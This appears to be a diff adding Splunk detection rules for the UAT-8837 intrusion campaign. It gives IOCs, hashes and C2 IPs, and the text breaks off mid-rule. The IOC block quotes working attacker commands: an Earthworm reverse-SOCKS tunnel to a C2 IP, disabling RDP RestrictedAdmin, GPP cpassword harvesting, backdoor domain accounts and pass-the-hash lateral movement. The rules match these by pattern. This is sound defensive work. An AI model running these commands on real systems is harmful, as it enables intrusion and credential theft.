@@ -1,0 +1,736 @@
+# ==============================================================================
+#  UAT-8837 — China-nexus APT Targeting North American Critical Infrastructure
+#  Splunk Detection Rules
+# ==============================================================================
+#  Description : Detection coverage for UAT-8837, a China-nexus APT cluster
+#                tracked by Cisco Talos (assessed medium-confidence China-nexus)
+#                that has targeted critical-infrastructure sectors (Energy,
+#                Healthcare, Manufacturing) in North America since at least 2025.
+#                The actor is tasked primarily with obtaining and maintaining
+#                INITIAL ACCESS to high-value organizations, then deploys
+#                open-source post-exploitation tooling to harvest credentials,
+#                enumerate Active Directory, move laterally, and exfiltrate data
+#                — including product DLL libraries (raising supply-chain /
+#                trojanization risk).
+#
+#                Observed kill chain:
+#                  1. Initial Access — exploitation of CVE-2025-53690 (Sitecore
+#                     ViewState deserialization RCE, CVSS 9.0) or valid/compromised
+#                     credentials. Post-exploit, the IIS worker (w3wp.exe) spawns
+#                     shells / tooling.
+#                  2. Defense Evasion — disables RDP RestrictedAdmin
+#                     (DisableRestrictedAdmin=0) to enable credential harvesting /
+#                     pass-the-hash over RDP; drops PE tools renamed to ".ico".
+#                  3. Discovery — burst of native recon (whoami, quser, tasklist,
+#                     netstat, net user/group, setspn, dsquery, dsget, nltest) and
+#                     SharpHound AD enumeration.
+#                  4. Credential Access — GoTokenTheft token theft, GPP cpassword
+#                     extraction (findstr /S cpassword), secedit /export, Rubeus
+#                     Kerberos abuse, Certipy AD CS abuse.
+#                  5. Lateral Movement — GoExec (WMI/DCOM), Impacket, Invoke-WMIExec
+#                     with stolen creds/hashes.
+#                  6. C2 / Exfil — Earthworm reverse SOCKS tunnels to attacker C2;
+#                     DWAgent remote-admin for persistence.
+#                  7. Persistence — backdoor domain accounts (net user /add /domain).
+#
+#  MITRE ATT&CK: T1190 (Exploit Public-Facing App), T1078 (Valid Accounts),
+#                T1112 (Modify Registry), T1036.008 (Masquerade File Type),
+#                T1105 (Ingress Tool Transfer), T1087.002 (Domain Account Discovery),
+#                T1482 (Domain Trust Discovery), T1552.006 (Group Policy Preferences),
+#                T1552.001 (Credentials In Files), T1136.002 (Create Domain Account),
+#                T1098 (Account Manipulation), T1558.003 (Kerberoasting),
+#                T1649 (Steal/Forge Auth Certificates), T1021.003/.006 (DCOM/WMI),
+#                T1572 (Protocol Tunneling), T1219 (Remote Access Software)
+#  Kill Chain   : Initial Access → Defense Evasion → Discovery → Credential Access →
+#                 Lateral Movement → C2 → Exfiltration → Persistence
+#  Platform     : Splunk Enterprise / Splunk Cloud (ES compatible)
+#  Data Sources : XmlWinEventLog:Microsoft-Windows-Sysmon/Operational (1,3,11,13),
+#                 XmlWinEventLog:Security (4688, 4720, 4728/4732, 4624/4625),
+#                 XmlWinEventLog:Microsoft-Windows-PowerShell/Operational (4104),
+#                 IIS / web access logs (Sitecore), network/firewall/proxy/DNS
+#  Author       : Krishnendu
+#  Version      : 1.0.0
+#  Created      : 2026-06-10
+#  License      : MIT
+#
+#  References:
+#    - https://blog.talosintelligence.com/uat-8837/
+#    - https://nvd.nist.gov/vuln/detail/CVE-2025-53690
+#    - https://securityaffairs.com/186999/breaking-news/china-linked-apt-uat-8837-targets-north-american-critical-infrastructure.html
+#    - https://gurucul.com/latest-threats/uat-8837-targets-critical-infrastructure-sectors-in-north-america/
+#    - https://fortiguard.fortinet.com/threat-signal-report/6319/uat-8837-critical-infrastructure-attack
+#
+#  Cross-product coverage (correlate with these if available):
+#    - ClamAV : Win.Malware.Earthworm
+#    - Snort  : SIDs 61883, 61884, 63727, 63728, 300585
+# ==============================================================================
+#
+#  PREREQUISITES:
+#
+#  1. Endpoint telemetry on Windows servers/workstations (esp. internet-facing
+#     IIS/Sitecore hosts and Domain Controllers):
+#     - Sysmon Events 1 (ProcessCreate), 3 (NetworkConnect), 11 (FileCreate),
+#       13 (RegistryValueSet)
+#     - Security 4688 (process creation w/ command line) as a fallback to Sysmon 1
+#  2. PowerShell Script Block Logging (Event 4104).
+#  3. Windows Security: 4720 (account created), 4728/4732 (added to group),
+#     4624/4625 (logon) on DCs and member servers.
+#  4. IIS / web access logs from Sitecore / public-facing ASP.NET hosts.
+#  5. Network egress (firewall / proxy / DNS / Zeek) for C2 IP match.
+#  6. Lookup tables:
+#     - uat8837_file_hashes.csv   (sha256, tool)     # seed from the Talos IOC list
+#     - uat8837_c2_ips.csv        (ip)               # optional; IPs also inlined
+#     - sitecore_servers.csv      (host, environment) # optional FP scoping
+#
+# ==============================================================================
+#
+#  IOC REFERENCE — UAT-8837 (from Cisco Talos)
+#
+#  CVE: CVE-2025-53690 (Sitecore ViewState deserialization RCE, CVSS 9.0)
+#
+#  C2 IPs:
+#    74.176.166.174   20.200.129.75   172.188.162.183   4.144.1.47   103.235.46.102
+#
+#  Tool SHA256 (representative — seed uat8837_file_hashes.csv from full Talos list):
+#    GoTokenTheft 1b3856e5d8c6a4cec1c09a68e0f87a5319c1bd4c8726586fd3ea1b3434e22dfa
+#    GoTokenTheft 891246a7f6f7ba345f419404894323045e5725a2252c000d45603d6ddf697795
+#    Earthworm    451e03c6a783f90ec72e6eab744ebd11f2bdc66550d9a6e72c0ac48439d774cd
+#    Earthworm    b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b
+#    Earthworm    fab292c72ad41bae2f02ae5700c5a88b40a77f0a3d9cbdf639f52bc4f92bb0a6
+#    Earthworm    4f7518b2ee11162703245af6be38f5db50f92e65c303845ef13b12c0f1fc2883
+#    SharpHound   5090f311b37309767fb41fa9839d2770ab382326f38bab8c976b83ec727e6796
+#    Impacket     6e8af5c507b605a16373e8453782bfd8a3ec3bd76f891e71a159d8c2ff2a5bb0
+#    GoExec       887817fbaf137955897d62302c5d6a46d6b36cb34775e4693e30e32609fb6744
+#    GoExec       4af156b3285b49485ef445393c26ca1bb5bfe7cdc59962c5c5725e3f3c574f7c
+#    SharpWMI     1de72bb4f116e969faff90c1e915e70620b900e3117788119cffc644956a9183
+#    Rubeus       51d6448e886521aaaaf929a50763156ceb99ede587c65de971700a5583d6a487
+#    Rubeus       2f295f0cedc37b0e1ea22de9d8cb461fa6f84ab0673fde995fd0468a485ddb59
+#    Certipy      e27e6e8e97421593f1e8d66f280e894525e22b373248709beaf81dc6107fb88d
+#
+#  Masquerade filenames (PE tools renamed .ico, dropped in Temp/public):
+#    C:\Windows\Temp\v.ico  verr.ico  eir.ico  (Earthworm)
+#    C:\Windows\Temp\wec.ico (Impacket)   r.ico (Rubeus)   goe.ico (GoExec)
+#    C:\Windows\Temp\SharpHound.exe   Certipy.exe   Invoke-WMIExec.ps1   lo.txt
+#    C:\Users\...\Downloads\dwagent.exe (DWAgent)
+#
+#  Signature commands:
+#    REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+#    <ew>.ico -s rssocks -d 172.188.162.183 -e 1433|443        (Earthworm reverse SOCKS)
+#    <ew>.ico -p 8888 -t 172.188.162.183 -f 11112
+#    findstr /S /l cpassword \\<domain>\...\policies\*.xml      (GPP password theft)
+#    secedit /export /cfg C:\windows\temp\pol.txt
+#    net user <u> <p> /add /domain   +   net localgroup/group <grp> <u> /add
+#    setspn -Q */*   dsquery user -limit 0   nltest /DCLIST:<domain>
+#    goe.ico wmi proc <ip> -u <u>/<p> -H <hash>   |   goe.ico dcom mmc <ip> --nt-hash <hash>
+#
+# ==============================================================================
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 1: CVE-2025-53690 Sitecore Exploitation — IIS Worker Spawns Shell/Tooling
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Initial-access detection. ViewState deserialization yields code execution
+#  inside the IIS worker (w3wp.exe). w3wp.exe spawning a shell, recon utility,
+#  or a ".ico" executable is the highest-fidelity post-exploitation signal.
+#
+#  Confidence : CRITICAL   Severity : CRITICAL   FP Rate : Very low
+
+rule_1_sitecore_viewstate_w3wp_child:
+  name: "UAT-8837 — Sitecore (CVE-2025-53690) IIS Worker Spawning Shell/Tooling"
+  description: >
+    Detects the IIS worker process (w3wp.exe) — the execution context of a
+    Sitecore ViewState deserialization (CVE-2025-53690) compromise — spawning a
+    command interpreter, native reconnaissance utility, or a PE renamed to .ico.
+    UAT-8837 used CVE-2025-53690 for initial access before pivoting to
+    open-source post-exploitation tooling. Web servers should essentially never
+    spawn interactive shells.
+  mitre:
+    tactic: "Initial Access"
+    technique: "T1190"
+    technique_name: "Exploit Public-Facing Application"
+  severity: CRITICAL
+  confidence: HIGH
+  risk_score: 98
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security")
+    (EventCode=1 OR EventCode=4688)
+    (ParentImage="*\\w3wp.exe" OR parent_process_name="w3wp.exe"
+     OR ParentImage="*\\Sitecore*" OR ParentImage="*\\dllhost.exe")
+    | eval child=lower(coalesce(mvindex(split(Image,"\\"),-1), New_Process_Name, process_name))
+    | eval cmd=coalesce(CommandLine, Process_Command_Line, command)
+    | where (match(child,"^(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|whoami|net|net1|tasklist|quser|netstat|nltest|dsquery|setspn|reg|certutil|bitsadmin)\.exe$")
+             OR match(lower(coalesce(Image,"")),"\\.ico$") OR match(lower(cmd),"\\.ico( |$)"))
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(child) as child_proc values(cmd) as command_lines values(User) as users
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer child_proc command_lines users first_seen last_seen count
+  schedule:
+    cron: "*/2 * * * *"
+    window: "-3m@m"
+  throttle:
+    field: "Computer"
+    period: "10m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Sitecore/IIS worker spawned shell or tooling on $Computer$"
+      severity: critical
+      drilldown_search: >
+        index=main Computer="$Computer$" (EventCode=1 OR EventCode=11 OR EventCode=3) earliest=-1h
+      recommended_actions:
+        - Isolate the Sitecore/IIS host; confirm CVE-2025-53690 patch + rotated ASP.NET machine keys
+        - Capture the w3wp.exe process tree and any dropped .ico / tooling
+        - Hunt the same host for Rules 2–9 (RestrictedAdmin, recon, Earthworm, account creation)
+        - Treat as confirmed initial-access compromise; begin IR
+    risk:
+      score: 98
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Sitecore deployment/maintenance jobs that legitimately shell out — allowlist by host + command pattern"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 2: DisableRestrictedAdmin Registry Modification (RDP Cred Harvest)
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Defense-evasion signature. UAT-8837 sets DisableRestrictedAdmin=0 to allow
+#  plaintext/PtH credential reuse over RDP. This key change is rare and high-signal.
+#
+#  Confidence : HIGH   Severity : CRITICAL   FP Rate : Near-zero
+
+rule_2_disable_restricted_admin:
+  name: "UAT-8837 — RDP RestrictedAdmin Disabled via Registry"
+  description: >
+    Detects modification of HKLM\System\CurrentControlSet\Control\Lsa
+    DisableRestrictedAdmin to 0, a UAT-8837 defense-evasion step that re-enables
+    credential delegation over RDP for credential harvesting / pass-the-hash.
+    Catches both the Sysmon registry event and the reg.exe command line.
+  mitre:
+    tactic: "Defense Evasion"
+    technique: "T1112"
+    technique_name: "Modify Registry"
+  severity: CRITICAL
+  confidence: HIGH
+  risk_score: 95
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security")
+    ((EventCode=13 AND TargetObject="*\\Control\\Lsa\\DisableRestrictedAdmin")
+     OR ((EventCode=1 OR EventCode=4688) AND (CommandLine="*DisableRestrictedAdmin*" OR Process_Command_Line="*DisableRestrictedAdmin*")))
+    | eval cmd=coalesce(CommandLine, Process_Command_Line, "")
+    | eval newval=coalesce(Details, "")
+    | where (match(newval,"(?i)DWORD \(0x0+\)") OR match(cmd,"(?i)/d 0+ ") OR match(cmd,"(?i)/d 0+$") OR EventCode=13)
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(cmd) as command_lines values(Image) as process values(User) as users values(newval) as reg_value
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer process command_lines reg_value users first_seen last_seen count
+  schedule:
+    cron: "*/5 * * * *"
+    window: "-6m@m"
+  throttle:
+    field: "Computer"
+    period: "30m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: RDP RestrictedAdmin disabled on $Computer$"
+      severity: critical
+      recommended_actions:
+        - Re-enable RestrictedAdmin and investigate who/what made the change
+        - Treat host as compromised; hunt for follow-on RDP logons and credential theft
+        - Correlate with Rules 1, 3, 5 on the same host
+    risk:
+      score: 95
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Rare legitimate admin tooling that toggles RestrictedAdmin — validate via change ticket"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 3: UAT-8837 Tool Hash / Filename Match
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Direct IOC match against published SHA256 hashes and the distinctive
+#  masquerade filenames used by UAT-8837 tooling.
+#
+#  Confidence : CRITICAL   Severity : CRITICAL   FP Rate : Near-zero (hash); Low (name)
+
+rule_3_uat8837_tool_ioc:
+  name: "UAT-8837 — Known Tool Hash or Masquerade Filename"
+  description: >
+    Detects execution or creation of known UAT-8837 tooling by SHA256 hash
+    (uat8837_file_hashes.csv — GoTokenTheft, Earthworm, SharpHound, Impacket,
+    GoExec, SharpWMI, Rubeus, Certipy) or by the actor's masquerade filenames
+    (PE tools renamed .ico in C:\Windows\Temp, dwagent.exe, SharpHound.exe,
+    Certipy.exe, Invoke-WMIExec.ps1).
+  mitre:
+    tactic: "Execution"
+    technique: "T1105"
+    technique_name: "Ingress Tool Transfer"
+  severity: CRITICAL
+  confidence: HIGH
+  risk_score: 96
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational")
+    (EventCode=1 OR EventCode=11)
+    | eval sha=lower(replace(coalesce(SHA256, Hashes, ""), ".*SHA256=([0-9A-Fa-f]+).*", "\1"))
+    | eval fpath=lower(coalesce(Image, TargetFilename, ""))
+    | eval fname=mvindex(split(fpath,"\\"),-1)
+    | lookup uat8837_file_hashes.csv sha256 AS sha OUTPUT tool as ioc_tool
+    | eval name_ioc=case(
+        match(fpath,"[\\\\/](windows[\\\\/]temp|users[\\\\/]public)[\\\\/].*\.ico$"), "MASQUERADE_ICO_PE",
+        match(fname,"^(v|verr|eir|wec|r|goe)\.ico$"), "UAT8837_TOOL_ICO",
+        match(fname,"^(sharphound\.exe|certipy\.exe|invoke-wmiexec\.ps1|dwagent\.exe)$"), "UAT8837_TOOL_NAME",
+        true(), null())
+    | where isnotnull(ioc_tool) OR isnotnull(name_ioc)
+    | eval finding=coalesce(ioc_tool, name_ioc)
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(finding) as findings values(fpath) as file_paths values(User) as users
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer findings file_paths users first_seen last_seen count
+  schedule:
+    cron: "*/5 * * * *"
+    window: "-6m@m"
+  throttle:
+    field: "Computer,findings"
+    period: "20m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Known tool/IOC ($findings$) on $Computer$"
+      severity: critical
+      recommended_actions:
+        - Quarantine the binary; confirm hash against the Talos IOC list
+        - Treat the host as compromised — full IR + domain-wide credential rotation
+        - Pivot to Rules 5-9 for C2, credential theft, lateral movement, persistence
+    risk:
+      score: 96
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Authorized red-team use of the same open-source tools — allowlist the engagement host/window"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 4: PE Executable Masquerading as .ico Run From Temp/Public
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Behavioral / tool-agnostic. UAT-8837 consistently renamed PE tools to ".ico"
+#  and ran them from C:\Windows\Temp or C:\Users\Public. A process whose image
+#  ends in .ico is almost always malicious.
+#
+#  Confidence : HIGH   Severity : HIGH   FP Rate : Low
+
+rule_4_ico_pe_execution:
+  name: "UAT-8837 — PE Executable Masquerading as .ico"
+  description: >
+    Detects process execution where the image file extension is .ico (an icon
+    file should never be an executable image) or a command line invoking a .ico
+    as a program, particularly from C:\Windows\Temp or C:\Users\Public. This is
+    UAT-8837's file-type masquerading for Earthworm, Rubeus, Impacket, and GoExec.
+  mitre:
+    tactic: "Defense Evasion"
+    technique: "T1036.008"
+    technique_name: "Masquerade File Type"
+  severity: HIGH
+  confidence: HIGH
+  risk_score: 90
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security")
+    (EventCode=1 OR EventCode=4688)
+    | eval img=lower(coalesce(Image, New_Process_Name, ""))
+    | eval cmd=lower(coalesce(CommandLine, Process_Command_Line, ""))
+    | where match(img,"\\.ico$") OR match(cmd,"[\\\\/](windows[\\\\/]temp|users[\\\\/]public)[\\\\/][^ ]*\.ico( |$)")
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(img) as images values(cmd) as command_lines values(ParentImage) as parents values(User) as users
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer images parents command_lines users first_seen last_seen count
+  schedule:
+    cron: "*/5 * * * *"
+    window: "-6m@m"
+  throttle:
+    field: "Computer"
+    period: "15m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: .ico file executed as a program on $Computer$"
+      severity: high
+      recommended_actions:
+        - Capture and hash the .ico file; it is a renamed PE (Earthworm/Rubeus/Impacket/GoExec)
+        - Inspect the command line for SOCKS/Kerberos/WMI arguments to identify the tool
+        - Isolate the host and continue the IR chain
+    risk:
+      score: 90
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Extremely rare — legitimate software does not execute .ico files as programs"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 5: Earthworm SOCKS Tunneling + C2 IP Communication
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  C2 detection. Matches the Earthworm reverse-SOCKS command syntax and direct
+#  traffic to the published UAT-8837 C2 IP addresses.
+#
+#  Confidence : CRITICAL   Severity : CRITICAL   FP Rate : Near-zero
+
+rule_5_earthworm_c2:
+  name: "UAT-8837 — Earthworm SOCKS Tunnel / C2 Communication"
+  description: >
+    Detects UAT-8837 command-and-control: the Earthworm reverse-SOCKS command
+    syntax (rssocks / -s rssocks -d <c2> -e <port> / -p <port> -t <c2> -f) on
+    endpoints, and network traffic to the published C2 IP addresses
+    (74.176.166.174, 20.200.129.75, 172.188.162.183, 4.144.1.47, 103.235.46.102).
+  mitre:
+    tactic: "Command and Control"
+    technique: "T1572"
+    technique_name: "Protocol Tunneling"
+  severity: CRITICAL
+  confidence: HIGH
+  risk_score: 97
+  search: >
+    (index=main OR index=endpoint OR index=windows OR index=network OR index=firewall OR index=proxy OR index=dns)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security"
+     OR sourcetype="pan:traffic" OR sourcetype="zeek:conn" OR sourcetype="cisco:asa" OR sourcetype="fgt_traffic"
+     OR sourcetype="suricata:eve")
+    | eval cmd=lower(coalesce(CommandLine, Process_Command_Line, ""))
+    | eval dst=coalesce(dest_ip, DestinationIp, dst_ip, "")
+    | eval c2hit=if(dst IN ("74.176.166.174","20.200.129.75","172.188.162.183","4.144.1.47","103.235.46.102"), "C2_IP", null())
+    | eval ewhit=if(match(cmd,"(-s +rssocks|rssocks +-d|-p +[0-9]+ +-t +[0-9.]+ +-f|\.ico +-s +rssocks)"), "EARTHWORM_CMD", null())
+    | where isnotnull(c2hit) OR isnotnull(ewhit)
+    | eval finding=coalesce(c2hit, ewhit)
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(finding) as findings values(dst) as dest_ips values(cmd) as command_lines
+      values(src_ip) as source_hosts values(Computer) as endpoints by finding
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table finding endpoints source_hosts dest_ips command_lines first_seen last_seen count
+  schedule:
+    cron: "*/5 * * * *"
+    window: "-6m@m"
+  throttle:
+    field: "finding,dest_ips"
+    period: "30m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Earthworm C2 / tunnel activity ($findings$)"
+      severity: critical
+      drilldown_search: >
+        index=* (dest_ip IN ("74.176.166.174","20.200.129.75","172.188.162.183","4.144.1.47","103.235.46.102")) earliest=-7d
+      recommended_actions:
+        - Block all five C2 IPs at firewall/proxy/DNS immediately
+        - Identify and isolate every internal host that contacted the C2
+        - Hunt for the Earthworm binary (.ico) and the rssocks listener port
+        - Assume credential compromise on involved hosts
+    risk:
+      score: 97
+      object_type: "system"
+      object_field: "endpoints"
+  false_positives:
+    - "None expected — actor C2 infrastructure and tool-specific command syntax"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 6: Reconnaissance Command Burst
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Discovery detection. UAT-8837 runs a tight cluster of native recon commands
+#  shortly after access. A burst of distinct recon commands from one host/user is
+#  a reliable hands-on-keyboard indicator.
+#
+#  Confidence : MEDIUM   Severity : HIGH   FP Rate : Medium (tune threshold)
+
+rule_6_recon_command_burst:
+  name: "UAT-8837 — Host/AD Reconnaissance Command Burst"
+  description: >
+    Detects a burst of native reconnaissance commands characteristic of UAT-8837
+    hands-on enumeration (whoami, quser, hostname, tasklist, netstat, net user,
+    net group/localgroup, setspn, dsquery, dsget, nltest /DCLIST). Fires when a
+    single host runs several distinct recon commands within a short window.
+  mitre:
+    tactic: "Discovery"
+    technique: "T1087.002"
+    technique_name: "Account Discovery: Domain Account"
+  severity: HIGH
+  confidence: MEDIUM
+  risk_score: 80
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security")
+    (EventCode=1 OR EventCode=4688)
+    | eval proc=lower(coalesce(mvindex(split(Image,"\\"),-1), New_Process_Name, ""))
+    | eval cmd=lower(coalesce(CommandLine, Process_Command_Line, ""))
+    | eval recon=case(
+        match(proc,"^(whoami|quser|hostname|tasklist|netstat|nltest|dsquery|dsget|setspn)\.exe$"), proc,
+        match(cmd,"\bnet(1)? +(user|group|localgroup)\b"), "net_enum",
+        match(cmd,"setspn +-(q|l)") OR match(cmd,"nltest +/dclist"), "ad_enum",
+        true(), null())
+    | where isnotnull(recon)
+    | bucket _time span=10m
+    | stats dc(recon) as distinct_recon values(recon) as recon_cmds values(cmd) as command_lines values(User) as users
+      by _time Computer
+    | where distinct_recon >= 4
+    | eval window=strftime(_time,"%Y-%m-%d %H:%M:%S")
+    | table window Computer users distinct_recon recon_cmds command_lines
+  schedule:
+    cron: "*/10 * * * *"
+    window: "-12m@m"
+  throttle:
+    field: "Computer"
+    period: "30m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Recon command burst on $Computer$ ($distinct_recon$ distinct)"
+      severity: high
+      recommended_actions:
+        - Identify the user/process driving the recon and whether it is interactive
+        - Correlate with Rule 1 (initial access) and Rule 3 (tooling) on the host
+        - If confirmed, isolate and begin IR
+    risk:
+      score: 80
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Sysadmins / monitoring scripts running enumeration — allowlist known admin hosts/accounts, raise the distinct-count threshold"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 7: GPP cpassword Theft + secedit Security Policy Export
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Credential-access detection. UAT-8837 harvested Group Policy Preferences
+#  passwords (findstr cpassword) and exported security policy (secedit /export).
+#
+#  Confidence : HIGH   Severity : HIGH   FP Rate : Low
+
+rule_7_gpp_cpassword_secedit:
+  name: "UAT-8837 — GPP cpassword Theft / secedit Policy Export"
+  description: >
+    Detects UAT-8837 credential-access behaviors: searching SYSVOL Group Policy
+    XML for the (reversibly-encrypted) cpassword attribute via
+    "findstr /S /l cpassword ...\policies\*.xml", and exporting the local
+    security policy via "secedit /export". Both are classic AD credential-theft
+    primitives observed in this campaign.
+  mitre:
+    tactic: "Credential Access"
+    technique: "T1552.006"
+    technique_name: "Group Policy Preferences"
+  severity: HIGH
+  confidence: HIGH
+  risk_score: 88
+  search: >
+    (index=main OR index=endpoint OR index=windows)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security"
+     OR sourcetype="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational")
+    (EventCode=1 OR EventCode=4688 OR EventCode=4104)
+    | eval cmd=lower(coalesce(CommandLine, Process_Command_Line, ScriptBlockText, ""))
+    | where (match(cmd,"findstr.*cpassword") OR match(cmd,"cpassword.*\\.xml")
+             OR match(cmd,"secedit +/export") OR match(cmd,"get-gppassword"))
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(cmd) as command_lines values(Image) as process values(User) as users
+      by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer process command_lines users first_seen last_seen count
+  schedule:
+    cron: "*/10 * * * *"
+    window: "-12m@m"
+  throttle:
+    field: "Computer"
+    period: "30m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: GPP cpassword / secedit credential harvesting on $Computer$"
+      severity: high
+      recommended_actions:
+        - Identify which GPP-stored credentials may be exposed and rotate them
+        - Remove any cpassword values from SYSVOL Group Policy Preferences
+        - Correlate with recon (Rule 6) and lateral movement (Rule 9)
+    risk:
+      score: 88
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Security auditors scanning for GPP cpassword exposure — allowlist the audit host/account"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 8: Backdoor Domain Account Creation + Privileged Group Addition
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Persistence detection. UAT-8837 creates backdoor domain accounts and adds
+#  them to privileged groups for durable access.
+#
+#  Confidence : HIGH   Severity : HIGH   FP Rate : Low-Medium
+
+rule_8_backdoor_account_persistence:
+  name: "UAT-8837 — Backdoor Domain Account Creation / Privileged Group Add"
+  description: >
+    Detects backdoor account persistence: creation of a domain account via
+    "net user <u> <p> /add /domain" and/or addition of an account to a privileged
+    group via "net localgroup/group ... /add", as well as the corresponding
+    Windows Security events (4720 account created, 4728/4732 added to group).
+  mitre:
+    tactic: "Persistence"
+    technique: "T1136.002"
+    technique_name: "Create Account: Domain Account"
+  severity: HIGH
+  confidence: MEDIUM
+  risk_score: 86
+  search: >
+    (index=main OR index=endpoint OR index=windows OR index=wineventlog)
+    (sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" OR sourcetype="XmlWinEventLog:Security")
+    ((EventCode=1 OR EventCode=4688) AND (CommandLine="*net*user*/add*" OR CommandLine="*localgroup*/add*"
+       OR CommandLine="*/add /domain*" OR Process_Command_Line="*net*user*/add*"))
+    OR EventCode=4720 OR EventCode=4728 OR EventCode=4732
+    | eval cmd=coalesce(CommandLine, Process_Command_Line, "")
+    | eval evt=case(EventCode=4720,"ACCOUNT_CREATED",
+                    EventCode=4728 OR EventCode=4732,"ADDED_TO_PRIV_GROUP",
+                    match(lower(cmd),"/add +/domain"),"NET_USER_ADD_DOMAIN",
+                    match(lower(cmd),"localgroup.*/add|group.*/add"),"NET_GROUP_ADD",
+                    true(),"NET_USER_ADD")
+    | stats count min(_time) as first_seen max(_time) as last_seen
+      values(evt) as events values(cmd) as command_lines
+      values(Target_User_Name) as target_users values(User) as actor by Computer
+    | eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S"), last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
+    | table Computer events target_users actor command_lines first_seen last_seen count
+  schedule:
+    cron: "*/10 * * * *"
+    window: "-12m@m"
+  throttle:
+    field: "Computer,target_users"
+    period: "30m"
+  actions:
+    notable:
+      rule_title: "UAT-8837: Backdoor account / privileged group change on $Computer$"
+      severity: high
+      recommended_actions:
+        - Validate the new account / group change against an approved change request
+        - If unauthorized, disable the account, review its logons, and remove it
+        - Correlate with Rules 1-3 to tie it to the intrusion timeline
+    risk:
+      score: 86
+      object_type: "system"
+      object_field: "Computer"
+  false_positives:
+    - "Legitimate IT account provisioning — allowlist provisioning service accounts / hosts"
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+#  RULE 9: Kerberos / AD CS Abuse & WMI-DCOM Lateral Movement Tooling
+# ██████████████████████████████████████████████████████████████████████████████
+#
+#  Credential-access + lateral-movement detection. Catches Rubeus, Certipy,
+#  SharpHound, and GoExec usage by command-line signature (tool-agnostic to the
+#  .ico rename), plus SPN-roasting enumeration.
+#
+#  Confidence : HIGH   Severity : HIGH   FP Rate : Low
+
+rule_9_kerberos_adcs_wmi_tooling:
+  name: "UAT-8837 — Rubeus/Certipy/GoExec/SharpHound Usage"
+  description: >
+    Detects UAT-8837 post-exploitation tool usage by command-line signature:
+    Rubeus (asktgt/kerberoast/asreproast/ptt), Certipy (AD CS abuse), SharpHound
